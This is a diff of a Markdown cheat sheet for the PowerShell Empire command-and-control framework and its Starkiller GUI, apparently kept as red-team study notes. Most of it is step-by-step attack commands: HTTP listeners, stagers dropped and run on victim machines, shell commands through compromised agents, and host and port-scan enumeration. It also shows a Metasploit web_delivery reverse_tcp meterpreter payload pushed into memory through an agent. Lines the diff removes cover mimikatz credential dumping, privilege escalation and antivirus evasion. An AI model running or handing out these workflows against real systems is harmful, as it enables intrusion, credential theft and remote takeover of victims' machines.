@@ -1,124 +1,155 @@
 
 > [!abstract] PowerShell Empire & Starkiller Cheat Sheet
-> PowerShell Empire is a pure PowerShell post-exploitation framework designed for stealth and persistence. Starkiller is its graphical frontend. This guide covers the installation, CLI usage, and GUI workflow.
-> **MITRE ATT&CK Mapping:** [TA0011 Command and Control](https://attack.mitre.org/tactics/TA0011/) | [TA0002 Execution](https://attack.mitre.org/tactics/TA0002/)
+> A comprehensive guide for PowerShell Empire (Backend) and Starkiller (GUI). Covers installation, listener/stager creation, agent interaction, network enumeration, and Metasploit integration.
+> **MITRE ATT&CK Mapping:** [TA0011 Command and Control](https://attack.mitre.org/tactics/TA0011/)
 
-## Installation & Initial Setup
+## Installation & Setup
 
-> [!info]+ Installing Empire & Starkiller
+> [!info]+ Installation
 > ```bash
-> # Update repositories and install both packages
 > sudo apt update && sudo apt install powershell-empire starkiller -y
 > ```
+
+> [!tip]+ Starting the Server & Client
+> The Empire architecture is split into a backend Server and a frontend Client (CLI or GUI).
 > 
-> **Starting the Server (Terminal 1):**
+> **Step 1: Start the Server (Backend)**
+> This manages the listeners and agents.
 > ```bash
 > sudo powershell-empire server
-> # Wait until you see the "Server >" prompt
+> # Wait for the "Server >" prompt
 > ```
 > 
-> **Starting the CLI Client (Terminal 2):**
+> **Step 2: Start the Client (CLI)**
 > ```bash
 > sudo powershell-empire client
-> # Wait until you see the "(Empire) >" prompt
+> # Wait for the "(Empire) >" prompt
 > ```
-> 
-> **Accessing Starkiller (GUI):**
-> 1. Open Starkiller from the start menu or run `starkiller` in the terminal.
+
+> [!example]+ Accessing the GUI (Starkiller)
+> 1. Open Starkiller from the start menu or run `starkiller`.
 > 2. Login with default credentials:
 >    - **User:** `empireadmin`
 >    - **Pass:** `password123`
+> 
+> **GUI Workflow:**
+> 1. **Set up Listener:** Create an `http` listener.
+> 2. **Set up Stager:** Choose `windows/Csharp_exe` (Set your IP where the victim will send requests).
+> 3. **Download Stager:** Download the generated executable.
+> 4. **Execute:** Drop the stager onto the target machine and run it.
 
 ---
 
-## Empire CLI Workflow
+## CLI Workflow: Listeners & Stagers
 
-> [!tip]+ 1. Listeners (Setting up the C2)
-> Listeners wait for incoming connections from compromised hosts (agents).
+> [!danger]+ 1. Setting up HTTP Listener
 > ```text
-> (Empire) > listeners
 > (Empire) > uselistener http
-> (Empire: uselistener/http) > info
+> (Empire: uselistener/http) > set Host 0.0.0.0
 > (Empire: uselistener/http) > set Port 80
 > (Empire: uselistener/http) > execute
 > 
-> [*] Listener successfully started!
+> # Verify listener is running
+> (Empire: uselistener/http) > listeners
+> 
+> # Return to main menu
+> (Empire: uselistener/http) > main
 > ```
 
-> [!example]+ 2. Stagers (Generating the Payload)
-> Stagers are the initial payloads executed on the victim to establish a connection back to the listener.
+> [!bug]+ 2. Generating a Stager
 > ```text
-> (Empire) > usestager windows_launcher_bat
-> (Empire: usestager/windows_launcher_bat) > info
-> (Empire: usestager/windows_launcher_bat) > set Listener http
-> (Empire: usestager/windows_launcher_bat) > execute
+> (Empire) > usestager multi/launcher
+> (Empire: usestager/multi/launcher) > set listener http
+> (Empire: usestager/multi/launcher) > execute
+> # Copy the generated PowerShell code and run it in the target's CMD
 > 
-> [*] Stager saved to /tmp/launcher.bat
-> ```
-> *Other useful stagers: `windows_dll`, `windows_psh`, `multi_macro`.*
-
-> [!danger]+ 3. Agents (Interacting with Victims)
-> Once the stager runs on the victim, an Agent checks in.
-> ```text
-> (Empire) > agents
-> 
-> [*] Agent X7B2K9 checked in!
-> 
-> (Empire) > interact X7B2K9
-> (Empire: X7B2K9) > sysinfo
-> (Empire: X7B2K9) > shell whoami
-> (Empire: X7B2K9) > shell ipconfig
-> (Empire: X7B2K9) > upload /tmp/payload.exe C:\\Users\\Public\\payload.exe
-> (Empire: X7B2K9) > download C:\\Users\\victim\\secret.txt
-> ```
-
-> [!bug]+ 4. Modules (Post-Exploitation)
-> Empire comes with built-in modules for privilege escalation, lateral movement, and persistence.
-> ```text
-> (Empire: X7B2K9) > usemodule credentials/mimikatz/logonpasswords
-> (Empire: credentials/mimikatz/logonpasswords) > execute
-> 
-> (Empire: X7B2K9) > usemodule powershell/privesc/getsystem
-> (Empire: powershell/privesc/getsystem) > execute
-> ```
-> **Note:** To search for modules directly from the main menu:
-> ```text
-> (Empire) > searchmodule mimikatz
+> (Empire: usestager/multi/launcher) > agents
 > ```
 
 ---
 
-## Starkiller (GUI) Workflow
+## Agent Interaction & Execution
 
-> [!success]+ Using the Graphical Interface
-> Starkiller makes Empire much easier to manage, especially for reporting and visualizing agent graphs.
+> [!success]+ Managing Agents
+> Once a stager runs on the victim, an Agent checks in.
 > 
-> **1. Listeners Tab:**
-> - Click **Create**.
-> - Select `http` (or `https`).
-> - Configure the Port and Host IP.
-> - Click **Submit** to start the listener.
+> ```text
+> (Empire) > agents                   # Show active agents
+> (Empire) > interact <agentname>     # Interact with a specific agent
+> (Empire: <agentname>) > help        # Show available commands
+> (Empire: <agentname>) > ipconfig    # Run basic system commands
+> ```
 > 
-> **2. Stagers Tab:**
-> - Click **Create**.
-> - Select a stager type (e.g., `windows_psh` for a PowerShell one-liner).
-> - Select the Listener you just created.
-> - Click **Submit**. You can now copy the generated PowerShell command and run it on the victim.
-> 
-> **3. Agents Tab:**
-> - View all checked-in agents here.
-> - Click on an agent to view `sysinfo`, `agents.json` config, and execution history.
-> - Use the **Interact** button to open a dedicated terminal window for that specific agent.
-> 
-> **4. Modules Tab:**
-> - Browse the module tree (e.g., `Credentials` -> `Mimikatz`).
-> - Select the agent you want to run it on from the dropdown.
-> - Click **Submit** to execute the module on the target.
+> **Shell & Rename Commands:**
+> ```text
+> (Empire: agents) > help
+> (Empire: agents) > rename vxfsfa sindadhost  # Rename an agent
+> (Empire: agents) > interact sindadhost
+> (Empire: sindadhost) > help
+> (Empire: sindadhost) > shell "whoami"         # Run standard cmd commands
+> (Empire: sindadhost) > shell "hostname"
+> (Empire: sindadhost) > shell "ipconfig"
+> ```
 
 ---
 
-> [!warning] OPSEC (Operational Security) Notes
-> - **Event Logs:** Empire heavily relies on PowerShell, which generates massive amounts of Windows Event Log entries (ID 4104 - Script Block Logging).
-> - **AV/EDR Evasion:** Default Empire stagers are easily caught by modern Windows Defender. You may need to obfuscate the payload manually or use the `starkiller` integrations with tools like `Invoke-Obfuscation` before delivery.
-> - **HTTP Profile:** Consider using custom HTTP profiles or Malleable C2 (if using Empire 4.x+) to blend C2 traffic with normal web traffic.
+## Post-Exploitation & Enumeration
+
+> [!warning]+ Situational Awareness Modules
+> Empire uses PowerShell modules for enumeration. (Note: `situational_awareness` is a key PowerShell module category).
+> 
+> **Host Enumeration:**
+> ```text
+> (Empire: sindadhost) > usemodule powershell/situational_awareness/host/computerdetails
+> (Empire: powershell/situational_awareness/host/computerdetails) > options
+> (Empire: powershell/situational_awareness/host/computerdetails) > info
+> (Empire: powershell/situational_awareness/host/computerdetails) > set Agent sindadhost
+> (Empire: powershell/situational_awareness/host/computerdetails) > execute
+> (Empire: powershell/situational_awareness/host/computerdetails) > back
+> ```
+> 
+> **Network Port Scan:**
+> ```text
+> (Empire: sindadhost) > usemodule powershell/situational_awareness/network/portscan
+> (Empire: powershell/situational_awareness/network/portscan) > set Hosts 172.20.30.1
+> (Empire: powershell/situational_awareness/network/portscan) > set Agent sindadhost
+> (Empire: powershell/situational_awareness/network/portscan) > execute
+> ```
+
+---
+
+## Metasploit Integration
+
+> [!example]+ Pivoting from Empire to Metasploit
+> You can use Empire to deliver a Metasploit payload directly into memory.
+> 
+> **Step 1: Setup Metasploit Web Delivery**
+> ```bash
+> msfconsole -q
+> ```
+> ```ruby
+> msf6 > search web_delivery
+> msf6 > use exploit/multi/script/web_delivery
+> msf6 > set Target 2
+> msf6 > set SRVHOST 0.0.0.0
+> msf6 > set LHOST <Your_Kali_IP>
+> msf6 > set payload windows/meterpreter/reverse_tcp
+> msf6 > exploit -j
+> # Copy the generated URL (e.g., http://<IP>:8080/...)
+> ```
+> 
+> **Step 2: Execute via Empire Agent**
+> ```text
+> (Empire: agents) > interact sindadhost
+> (Empire: sindadhost) > usemodule powershell/code_execution/invoke_metasploitpayload
+> (Empire: powershell/code_execution/invoke_metasploitpayload) > set URL <URL_from_Metasploit>
+> (Empire: powershell/code_execution/invoke_metasploitpayload) > set Agent sindadhost
+> (Empire: powershell/code_execution/invoke_metasploitpayload) > execute
+> ```
+
+---
+
+> [!quote] Resources
+> - **Empire Wiki:** [bc-security.gitbook.io/empire-wiki](https://bc-security.gitbook.io/empire-wiki)
+> - **GitHub:** [BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
 
